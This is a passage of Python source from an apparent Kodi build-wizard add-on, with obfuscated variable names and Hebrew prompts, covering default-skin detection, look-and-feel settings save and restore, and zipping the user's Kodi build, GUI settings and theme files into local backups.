	O00OOOO000O0OO000 =open (OO00OOOO0O0O00O00 ,'r+')#line:1524
	O000OO0OOO00O00O0 =O00OOOO000O0OO000 .read ().replace ('\n','').replace ('\r','').replace ('\t','').replace ('    ','');O00OOOO000O0OO000 .close ()#line:1525
	log ("Opening gui settings",xbmc .LOGNOTICE )#line:1526
	OOO0O00OO0O0O0000 =re .compile ('<lookandfeel>.+?<ski.+?>(.+?)</skin>.+?</lookandfeel>').findall (O000OO0OOO00O00O0 )#line:1527
	log ("Matches: %s"%str (OOO0O00OO0O0O0000 ),xbmc .LOGNOTICE )#line:1528
	if len (OOO0O00OO0O0O0000 )>0 :#line:1529
		OOO0000OOO000OO00 =OOO0O00OO0O0O0000 [0 ]#line:1530
		O0OOO0O00O0O0OOO0 =os .path .join (ADDONS ,OOO0O00OO0O0O0000 [0 ],'addon.xml')#line:1531
		if os .path .exists (O0OOO0O00O0O0OOO0 ):#line:1532
			OO000O0OO0OO00OO0 =open (O0OOO0O00O0O0OOO0 ,'r+')#line:1533
			OOO0OO00OO00O0OO0 =OO000O0OO0OO00OO0 .read ();OO000O0OO0OO00OO0 .close ()#line:1534
			O00O00OOOO00O0O00 =parseDOM (OOO0OO00OO00O0OO0 ,'addon',ret ='name')#line:1535
			if len (O00O00OOOO00O0O00 )>0 :O000OOOOOO00O0O00 =O00O00OOOO00O0O00 [0 ]#line:1536
			else :O000OOOOOO00O0O00 ='no match'#line:1537
		else :O000OOOOOO00O0O00 ='no file'#line:1538
		log ("[Default Skin Check] Skin name: %s"%O000OOOOOO00O0O00 ,xbmc .LOGNOTICE )#line:1539
		log ("[Default Skin Check] Skin id: %s"%OOO0000OOO000OO00 ,xbmc .LOGNOTICE )#line:1540
		setS ('defaultskin',OOO0000OOO000OO00 )#line:1541
		setS ('defaultskinname',O000OOOOOO00O0O00 )#line:1542
		setS ('defaultskinignore','false')#line:1543
	if os .path .exists (O0O00OO0OO0000OOO ):#line:1544
		log ("Deleting Temp Gui File.",xbmc .LOGNOTICE )#line:1545
		os .remove (O0O00OO0OO0000OOO )#line:1546
	log ("[Default Skin Check] End",xbmc .LOGNOTICE )#line:1547
def lookandFeelData (do ='save'):#line:1549
	O0OOO00O00OO0OO0O =['lookandfeel.enablerssfeeds','lookandfeel.font','lookandfeel.rssedit','lookandfeel.skincolors','lookandfeel.skintheme','lookandfeel.skinzoom','lookandfeel.soundskin','lookandfeel.startupwindow','lookandfeel.stereostrength']#line:1550
	if do =='save':#line:1551
		for OO0OO0OOO0OO0O0OO in O0OOO00O00OO0OO0O :#line:1552
			O000O0OO0OO00O0OO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":"%s"}, "id":1}'%(OO0OO0OOO0OO0O0OO )#line:1553
			OOO00000O000OOO00 =xbmc .executeJSONRPC (O000O0OO0OO00O0OO )#line:1554
			if not 'error'in OOO00000O000OOO00 :#line:1555
				O00O000000000O00O =re .compile ('{"value":(.+?)}').findall (str (OOO00000O000OOO00 ))#line:1556
				setS (OO0OO0OOO0OO0O0OO .replace ('lookandfeel','default'),O00O000000000O00O [0 ])#line:1557
				log ("%s saved to %s"%(OO0OO0OOO0OO0O0OO ,O00O000000000O00O [0 ]),xbmc .LOGNOTICE )#line:1558
	else :#line:1559
		for OO0OO0OOO0OO0O0OO in O0OOO00O00OO0OO0O :#line:1560
			O00000OOO0O0OOOOO =getS (OO0OO0OOO0OO0O0OO .replace ('lookandfeel','default'))#line:1561
			O000O0OO0OO00O0OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":"%s","value":%s}, "id":1}'%(OO0OO0OOO0OO0O0OO ,O00000OOO0O0OOOOO )#line:1562
			OOO00000O000OOO00 =xbmc .executeJSONRPC (O000O0OO0OO00O0OO )#line:1563
			log ("%s restored to %s"%(OO0OO0OOO0OO0O0OO ,O00000OOO0O0OOOOO ),xbmc .LOGNOTICE )#line:1564
def sep (middle =''):#line:1566
	OO0OO00O0OOOOOOO0 =uservar .SPACER #line:1567
	OOOO0O0OO0OO00000 =OO0OO00O0OOOOOOO0 *40 #line:1568
	if not middle =='':#line:1569
		middle ='[ %s ]'%middle #line:1570
		O000O0O0OOO0O0000 =int ((40 -len (middle ))/2 )#line:1571
		OOOO0O0OO0OO00000 ="%s%s%s"%(OOOO0O0OO0OO00000 [:O000O0O0OOO0O0000 ],middle ,OOOO0O0OO0OO00000 [:O000O0O0OOO0O0000 +2 ])#line:1572
	return OOOO0O0OO0OO00000 [:40 ]#line:1573
def convertAdvanced ():#line:1575
	if os .path .exists (ADVANCED ):#line:1576
		OOO000O00OO000000 =open (ADVANCED )#line:1577
		O0000O0OOOO0000OO =OOO000O00OO000000 .read ()#line:1578
		if KODIV >=17 :#line:1579
			return #line:1580
		else :#line:1581
			return #line:1582
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:1583
def backUpOptions (O00O00O0O0OO0O00O ,name =""):#line:1588
	O0OOO0O0OO0O00O0O =[ADDON_ID ,'cache','system','Thumbnails','peripheral_data','temp','My_Builds','library','keymaps']#line:1589
	OOO000OOO00000OOO =['Textures13.db','.DS_Store','advancedsettings.xml','Thumbs.db','.gitignore']#line:1590
	OOOO00000OO0O00OO =[os .path .join (DATABASE ,'onechannelcache.db'),os .path .join (DATABASE ,'saltscache.db'),os .path .join (DATABASE ,'saltscache.db-shm'),os .path .join (DATABASE ,'saltscache.db-wal'),os .path .join (DATABASE ,'saltshd.lite.db'),os .path .join (DATABASE ,'saltshd.lite.db-shm'),os .path .join (DATABASE ,'saltshd.lite.db-wal'),os .path .join (ADDOND ,'script.trakt','queue.db'),os .path .join (HOME ,'cache','commoncache.db'),os .path .join (ADDOND ,'script.module.dudehere.routines','access.log'),os .path .join (ADDOND ,'script.module.dudehere.routines','trakt.db'),os .path .join (ADDOND ,'script.module.metahandler','meta_cache','video_cache.db')]#line:1602
	OOO00O0OOO000OO0O =xbmc .translatePath (BACKUPLOCATION )#line:1604
	OO0OO0OOOO0O0O00O =xbmc .translatePath (MYBUILDS )#line:1605
	try :#line:1606
		if not os .path .exists (OOO00O0OOO000OO0O ):xbmcvfs .mkdirs (OOO00O0OOO000OO0O )#line:1607
		if not os .path .exists (OO0OO0OOOO0O0O00O ):xbmcvfs .mkdirs (OO0OO0OOOO0O0O00O )#line:1608
	except Exception as OO0O0OO000000OOO0 :#line:1609
		DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error making Back Up directories:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (OO0O0OO000000OOO0 )))#line:1610
		return #line:1611
	if O00O00O0O0OO0O00O =="build":#line:1612
		if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם ברצונך לגבות את הבילד?[/COLOR]"%COLOR2 ,nolabel ="[B][COLOR red]ביטול[/COLOR][/B]",yeslabel ="[B][COLOR green]גיבוי[/COLOR][/B]"):#line:1613
			if name =="":#line:1614
				name =getKeyboard ("","אנא הכנס שם ל %s באנגלית"%O00O00O0O0OO0O00O )#line:1615
				if not name :return False #line:1616
				name =name .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:1617
			name =urllib .quote_plus (name );O000OO0OOOOO000OO =''#line:1618
			OO0OOO0O000OO0O00 =os .path .join (OO0OO0OOOO0O0O00O ,'%s.zip'%name )#line:1619
			O0O0OO00O0O0O0OOO =0 #line:1620
			O0O0O00OOO0O000O0 =[]#line:1621
			if not DIALOG .yesno (ADDONTITLE ,"האם לשמור את תיקית האדון דאטה?",yeslabel ='[B][COLOR green]שמור[/COLOR][/B]',nolabel ='[B][COLOR red]לא לשמור[/COLOR][/B]'):#line:1622
				O0OOO0O0OO0O00O0O .append ('addon_data')#line:1623
			convertSpecial (HOME ,True )#line:1624
			asciiCheck (HOME ,True )#line:1625
			try :#line:1626
				OOOOOOO000OOOO000 =zipfile .ZipFile (xbmc .translatePath (OO0OOO0O000OO0O00 ),mode ='w')#line:1627
			except :#line:1628
				try :#line:1629
					O000OO0OOOOO000OO =os .path .join (PACKAGES ,'%s.zip'%name )#line:1630
					OOOOOOO000OOOO000 =zipfile .ZipFile (O000OO0OOOOO000OO ,mode ='w')#line:1631
				except :#line:1632
					log ("Unable to create %s.zip"%name ,xbmc .LOGERROR )#line:1633
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:1634
						openS ()#line:1635
						return #line:1636
					else :#line:1637
						return #line:1638
			DP .create ("[COLOR %s]%s[/COLOR][COLOR %s]: Creating Zip[/COLOR]"%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Creating back up zip"%COLOR2 ,"","Please Wait...[/COLOR]")#line:1639
			for O000OOO0OO0OO00OO ,OO000OOOOO0O000O0 ,OO00O0O0000O0O0O0 in os .walk (HOME ):#line:1640
				OO000OOOOO0O000O0 [:]=[O00000OO00O0000O0 for O00000OO00O0000O0 in OO000OOOOO0O000O0 if O00000OO00O0000O0 not in O0OOO0O0OO0O00O0O ]#line:1641
				OO00O0O0000O0O0O0 [:]=[O00O00O0000OOOO0O for O00O00O0000OOOO0O in OO00O0O0000O0O0O0 if O00O00O0000OOOO0O not in OOO000OOO00000OOO ]#line:1642
				for OO0OOOO0000O0OO0O in OO00O0O0000O0O0O0 :#line:1643
					O0O0O00OOO0O000O0 .append (OO0OOOO0000O0OO0O )#line:1644
			O00000O000OOO00O0 =len (O0O0O00OOO0O000O0 )#line:1645
			fixmetas ()#line:1646
			for O000OOO0OO0OO00OO ,OO000OOOOO0O000O0 ,OO00O0O0000O0O0O0 in os .walk (HOME ):#line:1647
				OO000OOOOO0O000O0 [:]=[OO0OOO00OO000OOOO for OO0OOO00OO000OOOO in OO000OOOOO0O000O0 if OO0OOO00OO000OOOO not in O0OOO0O0OO0O00O0O ]#line:1648
				OO00O0O0000O0O0O0 [:]=[OO0OO0OO0OOO00000 for OO0OO0OO0OOO00000 in OO00O0O0000O0O0O0 if OO0OO0OO0OOO00000 not in OOO000OOO00000OOO ]#line:1649
				for OO0OOOO0000O0OO0O in OO00O0O0000O0O0O0 :#line:1650
					try :#line:1651
						O0O0OO00O0O0O0OOO +=1 #line:1652
						OO0O0000O0OO00O00 =percentage (O0O0OO00O0O0O0OOO ,O00000O000OOO00O0 )#line:1653
						DP .update (int (OO0O0000O0OO00O00 ),'[COLOR %s]Creating back up zip: [COLOR%s]%s[/COLOR] / [COLOR%s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OO00O0O0O0OOO ,COLOR1 ,O00000O000OOO00O0 ),'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOOO0000O0OO0O ),'')#line:1654
						O00000OO0OOO0000O =os .path .join (O000OOO0OO0OO00OO ,OO0OOOO0000O0OO0O )#line:1655
						if OO0OOOO0000O0OO0O in LOGFILES :log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1656
						elif os .path .join (O000OOO0OO0OO00OO ,OO0OOOO0000O0OO0O )in OOOO00000OO0O00OO :log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1657
						elif os .path .join ('addons','packages')in O00000OO0OOO0000O :log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1658
						elif OO0OOOO0000O0OO0O .endswith ('.csv'):log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1659
						elif OO0OOOO0000O0OO0O .endswith ('.pyo'):continue #line:1660
						elif OO0OOOO0000O0OO0O .endswith ('.db')and 'Database'in O000OOO0OO0OO00OO :#line:1661
							OO000OOO0OO0OO0O0 =OO0OOOO0000O0OO0O .replace ('.db','')#line:1662
							OO000OOO0OO0OO0O0 =''.join ([O00O00000OO0O000O for O00O00000OO0O000O in OO000OOO0OO0OO0O0 if not O00O00000OO0O000O .isdigit ()])#line:1663
							if OO000OOO0OO0OO0O0 in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:1664
								if not OO0OOOO0000O0OO0O ==latestDB (OO000OOO0OO0OO0O0 ):log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1665
						try :#line:1666
							OOOOOOO000OOOO000 .write (O00000OO0OOO0000O ,O00000OO0OOO0000O [len (HOME ):],zipfile .ZIP_DEFLATED )#line:1667
						except Exception as OO0O0OO000000OOO0 :#line:1668
							log ("[Back Up] Type = '%s': Unable to backup %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE )#line:1669
							log ("%s / %s"%(Exception ,OO0O0OO000000OOO0 ))#line:1670
					except Exception as OO0O0OO000000OOO0 :#line:1671
						log ("[Back Up] Type = '%s': Unable to backup %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE )#line:1672
						log ("Build Backup Error: %s"%str (OO0O0OO000000OOO0 ),xbmc .LOGNOTICE )#line:1673
			OOOOOOO000OOOO000 .close ()#line:1674
			xbmc .sleep (500 )#line:1675
			DP .update (100 ,"Creating %s_guisettings.zip"%name ,"","")#line:1676
			backUpOptions ('guifix',name )#line:1677
			if not O000OO0OOOOO000OO =='':#line:1678
				OO000000O00OO0OOO =xbmcvfs .rename (O000OO0OOOOO000OO ,OO0OOO0O000OO0O00 )#line:1679
				if OO000000O00OO0OOO ==0 :#line:1680
					xbmcvfs .copy (O000OO0OOOOO000OO ,OO0OOO0O000OO0O00 )#line:1681
					xbmcvfs .delete (O000OO0OOOOO000OO )#line:1682
			DP .close ()#line:1683
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR] [COLOR %s]backup successful:[/COLOR]"%(COLOR1 ,name ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO0O000OO0O00 ))#line:1684
	elif O00O00O0O0OO0O00O =="guifix":#line:1685
		if name =="":#line:1686
			OO0OO0O0OOO00O0OO =getKeyboard ("","Please enter a name for the %s zip"%O00O00O0O0OO0O00O )#line:1687
			if not OO0OO0O0OOO00O0OO :return False #line:1688
			convertSpecial (USERDATA ,True )#line:1689
			asciiCheck (USERDATA ,True )#line:1690
		else :OO0OO0O0OOO00O0OO =name #line:1691
		OO0OO0O0OOO00O0OO =urllib .quote_plus (OO0OO0O0OOO00O0OO );O0OO00OOO000000O0 =''#line:1692
		O0O000000OOO0O0O0 =xbmc .translatePath (os .path .join (OO0OO0OOOO0O0O00O ,'%s_guisettings.zip'%OO0OO0O0OOO00O0OO ))#line:1693
		if os .path .exists (GUISETTINGS ):#line:1694
			try :#line:1695
				OOOOOOO000OOOO000 =zipfile .ZipFile (O0O000000OOO0O0O0 ,mode ='w')#line:1696
			except :#line:1697
				try :#line:1698
					O0OO00OOO000000O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0OO0O0OOO00O0OO )#line:1699
					OOOOOOO000OOOO000 =zipfile .ZipFile (O0OO00OOO000000O0 ,mode ='w')#line:1700
				except :#line:1701
					log ("Unable to create %s_guisettings.zip"%OO0OO0O0OOO00O0OO ,xbmc .LOGERROR )#line:1702
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:1703
						openS ()#line:1704
						return #line:1705
					else :#line:1706
						return #line:1707
			try :#line:1708
				OOOOOOO000OOOO000 .write (GUISETTINGS ,'guisettings.xml',zipfile .ZIP_DEFLATED )#line:1709
				OOOOOOO000OOOO000 .write (PROFILES ,'profiles.xml',zipfile .ZIP_DEFLATED )#line:1710
				OOO0OO0OOO000OO0O =glob .glob (os .path .join (ADDOND ,'skin.*',''))#line:1711
				log (str (OOO0OO0OOO000OO0O ),xbmc .LOGNOTICE )#line:1712
				for O0OOO0000O000OO0O in OOO0OO0OOO000OO0O :#line:1713
					OOO000OOO00O0OOO0 =os .path .split (O0OOO0000O000OO0O [:-1 ])[1 ]#line:1714
					if not OOO000OOO00O0OOO0 in ['skin.confluence','skin.re-touch','skin.estuary','skin.myconfluence','skin.estouchy','skin.anonymous.mod','skin.anonymous.nox','skin.Premium.mod']:#line:1715
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to add the following skin folder to the GuiFix Zip File?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000OOO00O0OOO0 ),yeslabel ="[B][COLOR green]Add Skin[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Skin[/COLOR][/B]"):#line:1716
							for O000OOO0OO0OO00OO ,OO000OOOOO0O000O0 ,OO00O0O0000O0O0O0 in os .walk (os .path .join (ADDOND ,O0OOO0000O000OO0O )):#line:1717
								OO00O0O0000O0O0O0 [:]=[OO0OOO0OO0O0OO0O0 for OO0OOO0OO0O0OO0O0 in OO00O0O0000O0O0O0 if OO0OOO0OO0O0OO0O0 not in OOO000OOO00000OOO ]#line:1718
								for OO0OOOO0000O0OO0O in OO00O0O0000O0O0O0 :#line:1719
									O00000OO0OOO0000O =os .path .join (O000OOO0OO0OO00OO ,OO0OOOO0000O0OO0O )#line:1720
									OOOOOOO000OOOO000 .write (O00000OO0OOO0000O ,O00000OO0OOO0000O [len (USERDATA ):],zipfile .ZIP_DEFLATED )#line:1721
							OOO0OO0OOO000OO0O =parseDOM (link ,'import',ret ='addon')#line:1722
							if 'script.skinshortcuts'in OOO0OO0OOO000OO0O :#line:1723
								for O000OOO0OO0OO00OO ,OO000OOOOO0O000O0 ,OO00O0O0000O0O0O0 in os .walk (os .path .join (ADDOND ,'script.skinshortcuts')):#line:1724
									OO00O0O0000O0O0O0 [:]=[OOO0O000O00OOOO00 for OOO0O000O00OOOO00 in OO00O0O0000O0O0O0 if OOO0O000O00OOOO00 not in OOO000OOO00000OOO ]#line:1725
									for OO0OOOO0000O0OO0O in OO00O0O0000O0O0O0 :#line:1726
										O00000OO0OOO0000O =os .path .join (O000OOO0OO0OO00OO ,OO0OOOO0000O0OO0O )#line:1727
										OOOOOOO000OOOO000 .write (O00000OO0OOO0000O ,O00000OO0OOO0000O [len (USERDATA ):],zipfile .ZIP_DEFLATED )#line:1728
						else :log ("[Back Up] Type = '%s': %s ignored"%(O00O00O0O0OO0O00O ,O0OOO0000O000OO0O ),xbmc .LOGNOTICE )#line:1729
			except Exception as OO0O0OO000000OOO0 :#line:1730
				log ("[Back Up] Type = '%s': %s"%(O00O00O0O0OO0O00O ,OO0O0OO000000OOO0 ),xbmc .LOGNOTICE )#line:1731
				pass #line:1732
			OOOOOOO000OOOO000 .close ()#line:1733
			if not O0OO00OOO000000O0 =='':#line:1734
				OO000000O00OO0OOO =xbmcvfs .rename (O0OO00OOO000000O0 ,O0O000000OOO0O0O0 )#line:1735
				if OO000000O00OO0OOO ==0 :#line:1736
					xbmcvfs .copy (O0OO00OOO000000O0 ,O0O000000OOO0O0O0 )#line:1737
					xbmcvfs .delete (O0OO00OOO000000O0 )#line:1738
		else :log ("[Back Up] Type = '%s': guisettings.xml not found"%O00O00O0O0OO0O00O ,xbmc .LOGNOTICE )#line:1739
		if name =="":#line:1740
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]GuiFix backup successful:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O000000OOO0O0O0 ))#line:1741
	elif O00O00O0O0OO0O00O =="theme":#line:1742
		if not DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to create a theme backup?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Continue[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):LogNotify ("Theme Backup","Cancelled!");return False #line:1743
		if name =="":#line:1744
			O0O0O00O000OO0OOO =getKeyboard ("","Please enter a name for the %s zip"%O00O00O0O0OO0O00O )#line:1745
			if not O0O0O00O000OO0OOO :return False #line:1746
		else :O0O0O00O000OO0OOO =name #line:1747
		O0O0O00O000OO0OOO =urllib .quote_plus (O0O0O00O000OO0OOO );O000OO0OOOOO000OO =''#line:1748
		OO0OOO0O000OO0O00 =os .path .join (OO0OO0OOOO0O0O00O ,'%s.zip'%O0O0O00O000OO0OOO )#line:1749
		try :#line:1750
			OOOOOOO000OOOO000 =zipfile .ZipFile (xbmc .translatePath (OO0OOO0O000OO0O00 ),mode ='w')#line:1751
		except :#line:1752
			try :#line:1753
				O000OO0OOOOO000OO =os .path .join (PACKAGES ,'%s.zip'%O0O0O00O000OO0OOO )#line:1754
				OOOOOOO000OOOO000 =zipfile .ZipFile (O000OO0OOOOO000OO ,mode ='w')#line:1755
			except :#line:1756
				log ("Unable to create %s.zip"%O0O0O00O000OO0OOO ,xbmc .LOGERROR )#line:1757
				if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:1758
					openS ()#line:1759
					return #line:1760
				else :#line:1761
					return #line:1762
		convertSpecial (USERDATA ,True )#line:1763
		asciiCheck (USERDATA ,True )#line:1764
		try :#line:1765
			if not SKIN =='skin.confluence':#line:1766
				O0O00O00OOOOOO00O =os .path .join (ADDONS ,SKIN ,'media')#line:1767
				OO0O00OOOOOO0000O =glob .glob (os .path .join (O0O00O00OOOOOO00O ,'*.xbt'))#line:1768
				if len (OO0O00OOOOOO0000O )>1 :#line:1769
					if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go through the Texture Files for?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:1770
						O0O00O00OOOOOO00O =os .path .join (ADDONS ,SKIN ,'media')#line:1771
						OO0O00OOOOOO0000O =glob .glob (os .path .join (O0O00O00OOOOOO00O ,'*.xbt'))#line:1772
						for OOOOOO00O0000O0OO in OO0O00OOOOOO0000O :#line:1773
							if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to add the Texture File [COLOR %s]%s[/COLOR]?"%(COLOR1 ,COLOR2 ,OOOOOO00O0000O0OO .replace (O0O00O00OOOOOO00O ,"")[1 :]),"from [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:1774
								O00000OO0OOO0000O =OOOOOO00O0000O0OO #line:1775
								O000OO000OO0OOO00 =O00000OO0OOO0000O .replace (HOME ,"")#line:1776
								OOOOOOO000OOOO000 .write (O00000OO0OOO0000O ,O000OO000OO0OOO00 ,zipfile .ZIP_DEFLATED )#line:1777
				else :#line:1778
					for OOOOOO00O0000O0OO in OO0O00OOOOOO0000O :#line:1779
						if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to add the Texture File [COLOR %s]%s[/COLOR]?"%(COLOR2 ,COLOR1 ,OOOOOO00O0000O0OO .replace (O0O00O00OOOOOO00O ,"")[1 :]),"from [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:1780
							O00000OO0OOO0000O =OOOOOO00O0000O0OO #line:1781
							O000OO000OO0OOO00 =O00000OO0OOO0000O .replace (HOME ,"")#line:1782
							OOOOOOO000OOOO000 .write (O00000OO0OOO0000O ,O000OO000OO0OOO00 ,zipfile .ZIP_DEFLATED )#line:1783
				OO000OOO00OOOOO00 =os .path .join (ADDOND ,SKIN ,'settings.xml')#line:1784
				if os .path .exists (OO000OOO00OOOOO00 ):#line:1785
					if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go add the [COLOR %s]settings.xml[/COLOR] in [COLOR %s]/addon_data/[/COLOR] for?"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Settings[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Settings[/COLOR][/B]"):#line:1786
						O0O00O00OOOOOO00O =os .path .join (ADDOND ,SKIN )#line:1787
						OOOOOOO000OOOO000 .write (OO000OOO00OOOOO00 ,OO000OOO00OOOOO00 .replace (HOME ,""),zipfile .ZIP_DEFLATED )#line:1788
				OOOO0O0O0OOO0000O =open (os .path .join (ADDONS ,SKIN ,'addon.xml'));O0OOOO000OO00OO0O =OOOO0O0O0OOO0000O .read ();OOOO0O0O0OOO0000O .close ()#line:1789
				OOO0OO0OOO000OO0O =parseDOM (O0OOOO000OO00OO0O ,'import',ret ='addon')#line:1790
				if 'script.skinshortcuts'in OOO0OO0OOO000OO0O :#line:1791
					if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go add the [COLOR %s]settings.xml[/COLOR] for [COLOR %s]script.skinshortcuts[/COLOR]?"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Add Settings[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Settings[/COLOR][/B]"):#line:1792
						for O000OOO0OO0OO00OO ,OO000OOOOO0O000O0 ,OO00O0O0000O0O0O0 in os .walk (os .path .join (ADDOND ,'script.skinshortcuts')):#line:1793
							OO00O0O0000O0O0O0 [:]=[OOOOOOOOO00000OO0 for OOOOOOOOO00000OO0 in OO00O0O0000O0O0O0 if OOOOOOOOO00000OO0 not in OOO000OOO00000OOO ]#line:1794
							for OO0OOOO0000O0OO0O in OO00O0O0000O0O0O0 :#line:1795
								O00000OO0OOO0000O =os .path .join (O000OOO0OO0OO00OO ,OO0OOOO0000O0OO0O )#line:1796
								OOOOOOO000OOOO000 .write (O00000OO0OOO0000O ,O00000OO0OOO0000O [len (HOME ):],zipfile .ZIP_DEFLATED )#line:1797
			if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include a [COLOR %s]Backgrounds[/COLOR] folder?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:1798
				O00000OO0OOO0000O =DIALOG .browse (0 ,'Select location of backgrounds','files','',True ,False ,HOME ,False )#line:1799
				if not O00000OO0OOO0000O ==HOME :#line:1800
					for O000OOO0OO0OO00OO ,OO000OOOOO0O000O0 ,OO00O0O0000O0O0O0 in os .walk (O00000OO0OOO0000O ):#line:1801
						OO000OOOOO0O000O0 [:]=[OO00000O0O0OO0000 for OO00000O0O0OO0000 in OO000OOOOO0O000O0 if OO00000O0O0OO0000 not in O0OOO0O0OO0O00O0O ]#line:1802
						OO00O0O0000O0O0O0 [:]=[O0OOO0O0000O00000 for O0OOO0O0000O00000 in OO00O0O0000O0O0O0 if O0OOO0O0000O00000 not in OOO000OOO00000OOO ]#line:1803
						for OO0OOOO0000O0OO0O in OO00O0O0000O0O0O0 :#line:1804
							try :#line:1805
								O000OO000OO0OOO00 =os .path .join (O000OOO0OO0OO00OO ,OO0OOOO0000O0OO0O )#line:1806
								OOOOOOO000OOOO000 .write (O000OO000OO0OOO00 ,O000OO000OO0OOO00 [len (HOME ):],zipfile .ZIP_DEFLATED )#line:1807
							except Exception as OO0O0OO000000OOO0 :#line:1808
								log ("[Back Up] Type = '%s': Unable to backup %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE )#line:1809
								log ("Backup Error: %s"%str (OO0O0OO000000OOO0 ),xbmc .LOGNOTICE )#line:1810
				O0O0O00O00O000O00 =latestDB ('Textures')#line:1811
